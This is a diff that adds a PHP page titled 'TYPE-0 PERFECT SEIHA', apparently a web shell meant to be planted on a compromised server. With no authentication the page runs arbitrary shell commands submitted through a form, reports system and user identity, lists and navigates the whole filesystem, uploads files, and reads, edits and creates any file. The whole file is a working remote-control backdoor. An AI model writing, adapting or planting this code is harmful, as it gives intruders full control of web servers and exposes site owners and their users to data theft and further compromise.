@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TYPE-0 PERFECT SEIHA</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Russo+One&display=swap');
+        body { 
+            font-family: 'Russo One', sans-serif; 
+            background-color: #f0f0f0; 
+            color: #333; 
+        }
+        .container { 
+            max-width: 800px; 
+            margin: 20px auto; 
+            padding: 20px; 
+            border: 1px solid #ccc; 
+            background-color: #fff; 
+        }
+        .file-list { 
+            list-style-type: none; 
+            padding: 0; 
+        }
+        .file-list li { 
+            margin-bottom: 5px; 
+        }
+        .editable-file { 
+            margin-top: 20px; 
+        }
+        textarea { 
+            width: 100%; 
+            height: 400px; 
+        }
+        .breadcrumb {
+            margin-bottom: 20px;
+            list-style: none;
+            padding: 0;
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .breadcrumb a {
+            text-decoration: none;
+            color: #007bff;
+        }
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        .breadcrumb li {
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>TYPE-0 PERFECT SEIHA</h2>
+
+        <?php
+        session_start();
+
+        echo '<h3>Server Info:</h3>';
+        echo '<pre>' . shell_exec('uname -a') . '</pre>';
+        echo '<h3>User Info:</h3>';
+        echo '<pre>' . shell_exec('id') . '</pre>';
+        echo '<h3>Server Software:</h3>';
+        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
+            echo '<pre>LiteSpeed</pre>';
+        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
+            echo '<pre>Apache</pre>';
+        } else {
+            echo '<pre>' . $_SERVER['SERVER_SOFTWARE'] . '</pre>';
+        }
+
+        function listFiles($dir) {
+            if (is_dir($dir)) {
+                if ($dh = opendir($dir)) {
+                    echo '<ul class="file-list">';
+                    echo '<li><a href="?dir='.urlencode(dirname($dir)).'">..</a> [DIR]</li>';  // Link to go up one level
+                    while (($file = readdir($dh)) !== false) {
+                        if ($file != '.' && $file != '..') {
+                            $filePath = $dir . '/' . $file;
+                            $writable = is_writable($filePath) ? 'Writable' : 'Not Writable';
+                            $size = is_dir($filePath) ? '-' : filesize($filePath) . ' bytes';
+                            if (is_dir($filePath)) {
+                                echo '<li><a href="?dir='.urlencode($filePath).'">'.$file.'</a> [DIR] - '.$writable.' - '.$size.'</li>';
+                            } else {
+                                echo '<li><a href="?edit='.urlencode($filePath).'">'.$file.'</a> [FILE] - '.$writable.' - '.$size.'</li>';
+                            }
+                        }
+                    }
+                    echo '</ul>';
+                    closedir($dh);
+                }
+            } else {
+                echo '<p>Not a valid directory.</p>';
+            }
+        }
+
+        if (!isset($_SESSION['current_dir'])) {
+            $_SESSION['current_dir'] = getcwd();
+        }
+
+        if (isset($_GET['dir'])) {
+            $newDir = $_GET['dir'];
+            if (is_dir($newDir)) {
+                $_SESSION['current_dir'] = realpath($newDir);
+            }
+        }
+
+        chdir($_SESSION['current_dir']);
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+            $uploadDir = $_SESSION['current_dir'] . '/';
+            $uploadFile = $uploadDir . basename($_FILES['file']['name']);
+            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
+                echo '<p>File uploaded successfully.</p>';
+            } else {
+                echo '<p>Failed to upload file.</p>';
+            }
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
+            $command = $_POST['command'];
+            if ($command) {
+                echo '<h3>Command Output:</h3>';
+                echo '<pre>';
+                echo shell_exec(escapeshellcmd($command));
+                echo '</pre>';
+            }
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
+            $fileToSave = $_POST['filename'];
+            $content = $_POST['content'];
+            file_put_contents($fileToSave, $content);
+            echo '<p>File saved successfully.</p>';
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_dir'])) {
+            $dirName = $_POST['dirname'];
+            if (!empty($dirName) && !file_exists($dirName)) {
+                mkdir($dirName);
+                echo '<p>Directory created successfully.</p>';
+            } else {
+                echo '<p>Failed to create directory. It may already exist.</p>';
+            }
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
+            $fileName = $_POST['filename'];
+            if (!empty($fileName) && !file_exists($fileName)) {
+                file_put_contents($fileName, '');
+                echo '<p>File created successfully.</p>';
+            } else {
+                echo '<p>Failed to create file. It may already exist.</p>';
+            }
+        }
+        ?>
+
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <button type="submit">Upload</button>
+        </form>
+
+        <hr>
+
+        <h3>Current Directory: <?php echo $_SESSION['current_dir']; ?></h3>
+
+        <?php
+        listFiles($_SESSION['current_dir']);
+        ?>
+
+        <hr>
+
+        <form method="GET">
+            <label for="dir">Change Directory:</label>
+            <input type="text" id="dir" name="dir" placeholder="Enter directory path">
+            <button type="submit">Go</button>
+        </form>
+
+        <hr>
+
+        <form method="POST">
+            <label for="command">Execute Command:</label>
+            <input type="text" id="command" name="command" placeholder="Enter command">
+            <button type="submit">Run Command</button>
+        </form>
+
+        <hr>
+
+        <form method="POST">
+            <label for="dirname">Create Directory:</label>
+            <input type="text" id="dirname" name="dirname" placeholder="Enter directory name">
+            <button type="submit" name="create_dir">Create Directory</button>
+        </form>
+
+        <hr>
+
+        <form method="POST">
+            <label for="filename">Create File:</label>
+            <input type="text" id="filename" name="filename" placeholder="Enter file name">
+            <button type="submit" name="create_file">Create File</button>
+        </form>
+
+        <hr>
+
+        <?php
+        if (isset($_GET['edit'])) {
+            $fileToEdit = $_GET['edit'];
+            if (is_file($fileToEdit) && is_readable($fileToEdit)) {
+                $content = file_get_contents($fileToEdit);
+                echo '<div class="editable-file">';
+                echo '<h3>Editing File: '.htmlspecialchars($fileToEdit).'</h3>';
+                echo '<form method="POST">';
+                echo '<input type="hidden" name="filename" value="'.htmlspecialchars($fileToEdit).'">';
+                echo '<textarea name="content">'.htmlspecialchars($content).'</textarea>';
+                echo '<button type="submit" name="save">Save</button>';
+                echo '</form>';
+                echo '</div>';
+            } else {
+                echo '<p>Unable to read the file.</p>';
+            }
+        }
+        ?>
+    </div>
+</body>
+</html>
